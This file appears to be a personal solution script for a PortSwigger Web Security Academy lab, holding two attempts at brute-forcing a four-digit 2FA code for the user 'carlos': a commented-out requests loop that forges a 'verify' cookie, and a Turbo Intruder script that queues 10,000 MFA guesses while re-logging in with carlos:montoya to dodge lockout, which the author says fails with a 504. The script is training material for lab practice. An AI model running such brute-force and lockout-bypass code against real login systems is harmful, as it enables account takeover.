#!/usr/bin/env python3
import requests
import string
import time
import random
"""
# Target URL
url = 'https://0a9c00bd041367aa80d4df1d00cb00cd.web-security-academy.net/login2'

cookies = {
    'verify' : 'carlos'
}


for code in range (0,10000):

    formatted_code = f"{code:04}"


    data = {
        'mfa-code': formatted_code
            }


    # Send POST request with FORM data using the data parameter
    response = requests.post(url, data=data, cookies=cookies)

    if code % 100 == 0:   # every 100 attempts
        print(f"Tried up to {formatted_code}...")

    if 'Incorrect security code' not in response.text or response.status_code == 302:
        print(f"2FA Found: {formatted_code}")
        break
"""
#the following code doesn't work, it returns a 504 response
# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.THREADED,
                           timeout=30
                           )

    iterations = 0


    for payload in range(10000):
        current_url = 'https://0a23001003ebb533816fc02c003500e0.web-security-academy.net/login2'
        formatted_code = "{:04}".format(payload)  # Always 4 digits

        post_req = target.req.replace("GET /", "POST /") #need this is the code to create a fresh target template each attempt
        post_req = post_req.replace("\r\n\r\n",
                                   "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nmfa-code=" + formatted_code)

        engine.queue(post_req, endpoint=current_url, callback=handleResponse)
        iterations += 1

        if iterations == 2:
            iterations = 0
            login_req = target.req.replace("GET /", "POST /")
            login_req = login_req.replace("\r\n\r\n",   # ← Use login_req, not post_req
                                         "\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=carlos&password=montoya")
            current_url = 'https://0a23001003ebb533816fc02c003500e0.web-security-academy.net/login'
            engine.queue(login_req, endpoint=current_url, callback=ignoreResponse) # ← Queue the fresh template

def handleResponse(req, interesting):
    table.add(req)

def ignoreResponse(req, interesting):
    pass
